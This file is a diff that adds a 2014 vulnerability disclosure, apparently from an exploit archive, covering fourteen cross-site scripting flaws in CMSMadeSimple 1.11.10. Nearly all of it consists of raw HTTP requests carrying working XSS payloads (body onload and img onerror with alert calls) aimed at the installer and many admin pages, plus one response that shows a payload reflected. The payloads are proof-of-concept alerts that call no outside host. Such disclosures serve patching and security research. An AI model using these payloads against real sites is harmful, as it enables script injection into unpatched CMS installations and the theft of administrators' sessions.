@@ -1,0 +1,234 @@
+id: 21939
+date: 02/23/2014
+title: CMSMadeSimple 1.11.10 Cross Site Scripting Vulnerability
+author: HauntIT
+cves: 
+
+# ==============================================================
+# Title ...| CMSMadeSimple Multiple vulnerabilities
+# Version .| cmsmadesimple-1.11.10-full.tar.gz
+# Date ....| 20.02.2014
+# Found ...| HauntIT Blog
+# Home ....| http://www.cmsmadesimple.org
+# ==============================================================
+
+
+# ==============================================================
+# 1. XSS in install
+
+---<request>---
+POST /k/cms/cmsmadesimple/install/index.php?sessiontest=1 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 72
+
+default_cms_lang='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&submit=Submit
+---<request>---
+
+
+# ==============================================================
+# 2. docroot parameter persistent XSS and config edit vulnerability
+
+---<request>---
+POST /k/cms/cmsmadesimple/install/index.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 415
+
+docroot=$("%3cimg%2fsrc%3d'x'%2fonerror%3dalert(9999)%3e")&docpath=%2Fhome%2Fk%2Fpublic_html%2Fcms%2Fcmsmadesimple&querystr=page&frontendlang=en_US&umask=022&host=localhost&dbms=mysqli&database=cms&username=root&password=superpass&db_port=0&timezone=Europe%2FBerlin&prefix=cms_&createtables=1&email_accountinfo=0&adminemail=admin%40here.com&adminusername=admin&adminpassword=password&page=7&default_cms_lang=en_US
+---<request>---
+
+
+
+---<response>---
+
+<p>Updating hierarchy positions... [done]</p><p>Setting up core events... [done]</p><p>Installing modules... [done]</p><p>Clearing site cache (if any)... [done]</p>
+  <div class="success">
+      Congratulations, you are all setup - here is your  <a href="$("<img/src='x'/onerror=alert(9999)>")">CMS Site</a>
+    </div>
+
+<div class="continue">
+<form action="$("<img/src='x'/onerror=alert(9999)>")/admin/login.php" method="post" name="page7form" id="page7form">
+  <input type="submit" value="go to the Admin Panel" />
+---<response>---
+
+# ==============================================================
+# 3. XSS over GET (from admin user):
+
+http://10.149.14.62/cmsmadesimple/lib/filemanager/ImageManager/editorFrame.php?img=%2Flogo1.gif&action=%22;alert%28123%29;//
+ 
+
+# ==============================================================
+# 4. XSS
+---<request>---
+POST /k/cms/cmsmadesimple/admin/addhtmlblob.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 199
+
+_sx_=50f02dc0609d19b4&htmlblob='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&use_wysiwyg=0&use_wysiwyg=1&content=aaaaaa&description=aaaaaaaaaaa&additional_editors%5B%5D=-2&addhtmlblob=true&submit2=Submit
+---<request>---
+
+Also vulnerable: description
+
+
+# ==============================================================
+# 5. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/addtemplate.php?_sx_=50f02dc0609d19b4 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 1068
+
+template=$("%3cimg%2fsrc%3d'x'%2fonerror%3dalert(9999)%3e")&content=(...)=on&addtemplate=true&submit=Submit
+
+---<request>---
+
+Also vulnerable: content
+
+
+# ==============================================================
+# 6. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/addcss.php?_sx_=50f02dc0609d19b4 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 107
+
+css_name='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&css_text=zzzzzzzzzzzzzz&media_query=zzzzzzzz&addcss=true
+
+---<request>---
+
+# ==============================================================
+# 7. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/siteprefs.php?_sx_=50f02dc0609d19b4 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 299
+
+_sx_=50f02dc0609d19b4&active_tab=general&editsiteprefs=true&sitename=CMS+Made+Simple+Site&frontendlang=&frontendwysiwyg=-1&nogcbwysiwyg=0&metadata='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&logintheme=OneEleven&backendwysiwyg=-1&defaultdateformat=&thumbnail_width=96&thumbnail_height=96&submit=Submit
+---<request>---
+
+Also vulnerable: defaultdateformat
+
+
+
+# ==============================================================
+# 8. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/pagedefaults.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 376
+
+editpagedefaults=true&_sx_=50f02dc0609d19b4&default_contenttype=content&page_active=on&page_showinmenu=on&page_cachable=on&page_metadata='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&page_defaultcontent=%3C%21--+Add+code+here+that+should+appear+in+the+content+block+of+all+new+pages+--%3E&page_searchable=on&additional_editors=&page_extra1=&page_extra2=&page_extra3=&submit=Submit
+
+---<request>---
+
+Also vulnerable: page_defaultcontent
+
+# ==============================================================
+# 9. Persistent xss
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/addbookmark.php?_sx_=cb49601060b8ec40 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 101
+
+_sx_=cb49601060b8ec40&title='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&url=asdasd.com&addbookmark=true
+
+---<request>---
+
+Also vulnerable: url parameter
+
+
+# ==============================================================
+# 10. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/siteprefs.php?_sx_=cb49601060b8ec40 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 341
+
+_sx_=cb49601060b8ec40&active_tab=sitedown&editsiteprefs=true&enablesitedownmessage=0&use_wysiwyg=0&use_wysiwyg=1&sitedownmessage=%3Cp%3ESite+is+currently+down+for+maintenance.%3Cimg+src%3D%22zzzzzzz.com%22+alt%3D%22asdasdasd%22+%2F%3E%3C%2Fp%3E&sitedownexcludeadmins=0&sitedownexcludes='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&submit=Submit
+---<request>---
+
+
+# ==============================================================
+# 11. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/myaccount.php?_sx_=cb49601060b8ec40 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 441
+
+active_tab=advtab&edituserprefs=true&old_default_cms_lang=en_US&default_cms_language=en_US&date_format_string='%3e"%3e%3cbody%2fonload%3dalert(123123)%3e&wysiwyg=MicroTiny&syntaxhighlighter=-1&gcb_wysiwyg=on&indent=on&admintheme=OneEleven&homepage=&bookmarks=on&parent_id=-1&listtemplates_pagelimit=20&liststylesheets_pagelimit=20&listgcbs_pagelimit=20&enablenotifications=on&edituserprefs=true&old_default_cms_lang=en_US&submit_prefs=Submit
+
+---<request>---
+
+Also vulnerable: old_default_cms_lang
+
+
+# ==============================================================
+# 12. XSS
+
+---<request>---
+POST /k/cms/cmsmadesimple/admin/adminlog.php?_sx_=cb49601060b8ec40 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 97
+
+filteruser='%3e"%3e%3cbody%2fonload%3dalert(123123)%3e&filteraction=asd&filterapply=Apply+filters
+
+---<request>---
+
+Also vulnerable: filteraction
+
+
+# ==============================================================
+# 13. XSS
+
+---<request>---
+
+POST /k/cms/cmsmadesimple/admin/pagedefaults.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 378
+
+editpagedefaults=true&_sx_=cb49601060b8ec40&default_contenttype=content&page_active=on&page_showinmenu=on&page_cachable=on&page_metadata='%3e"%3e%3cbody%2fonload%3dalert(123123)%3e&page_defaultcontent=%3C%21--+Add+code+here+that+should+appear+in+the+content+block+of+all+new+pages+--%3E&page_searchable=on&additional_editors=&page_extra1=&page_extra2=&page_extra3=&submit=Submit
+
+---<request>---
+
+Also vulnerable: page_defaultcontent, page_extra1
+
+# ==============================================================
+# 14. XSS
+
+---<request>---
+
+POST /k/cms/cmsmadesimple/admin/editevent.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 132
+
+_sx_=cb49601060b8ec40&action=create&handler='%3e"%3e%3cbody%2fonload%3dalert(123123)%3e&module=News&event=NewsCategoryEdited&add=Add
+
+---<request>---
+
+Also vulnerable: event, add
+
+
+# ==============================================================
+# More @ http://HauntIT.blogspot.com
+# Thanks! ;)
+# o/
+
+#  0day.today [2023-03-26]  #
